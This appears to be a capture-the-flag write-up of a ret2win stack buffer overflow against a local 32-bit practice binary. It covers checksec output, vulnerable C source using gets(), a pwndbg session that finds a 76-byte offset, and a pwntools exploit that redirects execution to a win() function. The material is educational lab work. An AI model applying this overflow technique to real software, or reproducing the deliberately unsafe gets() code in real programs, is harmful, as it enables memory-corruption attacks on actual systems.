## First
Let's take a look at binary first :-
```
$ file first
first: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=14a073cd49a7132b68615aec4dfc0980d11bd8ba, for GNU/Linux 3.2.0, not stripped
$ checksec --file ./first
[*] '/home/zinc/Documents/NM-Pwn/ret2win/first/first'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

```
File is 32 bit not stripped, with no protections whatsoever.
We can use Ghidra for Decompile the code but we already have the source code.

In source code:-
```cpp
void vuln(){
	char buffer[64];
	printf("Enter your input: ");
	gets(buffer);
	printf("You entered: %s\n",buffer);
}
```
vuln() function uses gets() function to take the user input which is prone to buffer overflow, which will help us overflow this stack of this binary to the point of execution of win() function.

Using GDB we will find the offset till Instruction Pointer and the win().
```
pwndbg> disass vuln
Dump of assembler code for function vuln:
   0x080491c4 <+0>:     push   ebp
   0x080491c5 <+1>:     mov    ebp,esp
   0x080491c7 <+3>:     push   ebx
   0x080491c8 <+4>:     sub    esp,0x44
   0x080491cb <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491d0 <+12>:    add    ebx,0x2e30
   0x080491d6 <+18>:    sub    esp,0xc
   0x080491d9 <+21>:    lea    eax,[ebx-0x1ff0]
   0x080491df <+27>:    push   eax
   0x080491e0 <+28>:    call   0x8049050 <printf@plt>
   0x080491e5 <+33>:    add    esp,0x10
   0x080491e8 <+36>:    sub    esp,0xc
   0x080491eb <+39>:    lea    eax,[ebp-0x48]
   0x080491ee <+42>:    push   eax
   0x080491ef <+43>:    call   0x8049060 <gets@plt>
   0x080491f4 <+48>:    add    esp,0x10
   0x080491f7 <+51>:    sub    esp,0x8
   0x080491fa <+54>:    lea    eax,[ebp-0x48]
   0x080491fd <+57>:    push   eax
   0x080491fe <+58>:    lea    eax,[ebx-0x1fdd]
   0x08049204 <+64>:    push   eax
   0x08049205 <+65>:    call   0x8049050 <printf@plt>
   0x0804920a <+70>:    add    esp,0x10
   0x0804920d <+73>:    nop
   0x0804920e <+74>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049211 <+77>:    leave  
   0x08049212 <+78>:    ret    
End of assembler dump.
pwndbg> b *vuln+48
Note: breakpoints 1 and 2 also set at pc 0x80491f4.
Breakpoint 3 at 0x80491f4
pwndbg> r
Starting program: /home/zinc/Documents/NM-Pwn/ret2win/first/first 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your input: enem

Breakpoint 1, 0x080491f4 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
 EAX  0xffffcef0 ◂— 'enem'
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
 ECX  0xf7fa39c0 (_IO_stdfile_0_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd004 —▸ 0xffffd1d6 ◂— '/home/zinc/Documents/NM-Pwn/ret2win/first/first'
 EBP  0xffffcf38 —▸ 0xffffcf48 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffcee0 —▸ 0xffffcef0 ◂— 'enem'
 EIP  0x80491f4 (vuln+48) ◂— add esp, 0x10
───────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────────
 ► 0x80491f4 <vuln+48>    add    esp, 0x10               ESP => 0xffffcef0 (0xffffcee0 + 0x10)
   0x80491f7 <vuln+51>    sub    esp, 8                  ESP => 0xffffcee8 (0xffffcef0 - 0x8)
   0x80491fa <vuln+54>    lea    eax, [ebp - 0x48]       EAX => 0xffffcef0 ◂— 'enem'
   0x80491fd <vuln+57>    push   eax
   0x80491fe <vuln+58>    lea    eax, [ebx - 0x1fdd]     EAX => 0x804a023 ◂— 'You entered: %s\n'
   0x8049204 <vuln+64>    push   eax
   0x8049205 <vuln+65>    call   printf@plt                  <printf@plt>
 
   0x804920a <vuln+70>    add    esp, 0x10
   0x804920d <vuln+73>    nop    
   0x804920e <vuln+74>    mov    ebx, dword ptr [ebp - 4]
   0x8049211 <vuln+77>    leave  
───────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcee0 —▸ 0xffffcef0 ◂— 'enem'
01:0004│-054 0xffffcee4 ◂— 0x20 /* ' ' */
02:0008│-050 0xffffcee8 ◂— 0
03:000c│-04c 0xffffceec —▸ 0x80491d0 (vuln+12) ◂— add ebx, 0x2e30
04:0010│ eax 0xffffcef0 ◂— 'enem'
05:0014│-044 0xffffcef4 ◂— 0
06:0018│-040 0xffffcef8 ◂— 0x1000000
07:001c│-03c 0xffffcefc ◂— 0xb /* '\x0b' */
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► 0 0x80491f4 vuln+48
   1 0x8049228 main+21
   2 0xf7d99519 __libc_start_call_main+121
   3 0xf7d995f3 __libc_start_main+147
   4 0x80490ac _start+44
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> search enem
Searching for byte: b'enem'
[heap]          0x804d5b0 'enem\n'
[stack]         0xffffcef0 'enem'
pwndbg> info frame
Stack level 0, frame at 0xffffcf40:
 eip = 0x80491f4 in vuln; saved eip = 0x8049228
 called by frame at 0xffffcf50
 Arglist at 0xffffcf38, args: 
 Locals at 0xffffcf38, Previous frame's sp is 0xffffcf40
 Saved registers:
  ebx at 0xffffcf34, ebp at 0xffffcf38, eip at 0xffffcf3c
```
The eip is saved at 0xffffcf3c and our input starts at 0xffffcef0. This makes our offset (0xffffcf3c - 0xffffcef0) = 76. So we have to 76 worth of data after that we can give a return address to eip.

win() function:-
```cpp
void win(){
	printf("You win");
	exit(0);
}
```
```
zinc@ZINC-UBUNTU:~/Documents/NM-Pwn/ret2win/first$ nm ./first | grep win
08049196 T win
```
The address of win function is 0x08049196.

With this we have everything for writing an exploit.

```py
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./first', checksec=False)
io = process()

payload = b'A'*76 + pack(0x08049196)
io.sendline(payload)
print(io.recvall())
```
A simple python exploit to make win() function execute.

When we run it :-
```
$ python3 exploit.py 
[+] Starting local process '/home/zinc/Documents/NM-Pwn/ret2win/first/first': pid 15470
[+] Receiving all data: Done (119B)
[*] Process '/home/zinc/Documents/NM-Pwn/ret2win/first/first' stopped with exit code 0 (pid 15470)
b'Enter your input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x91\x04\x08\nYou win'
```
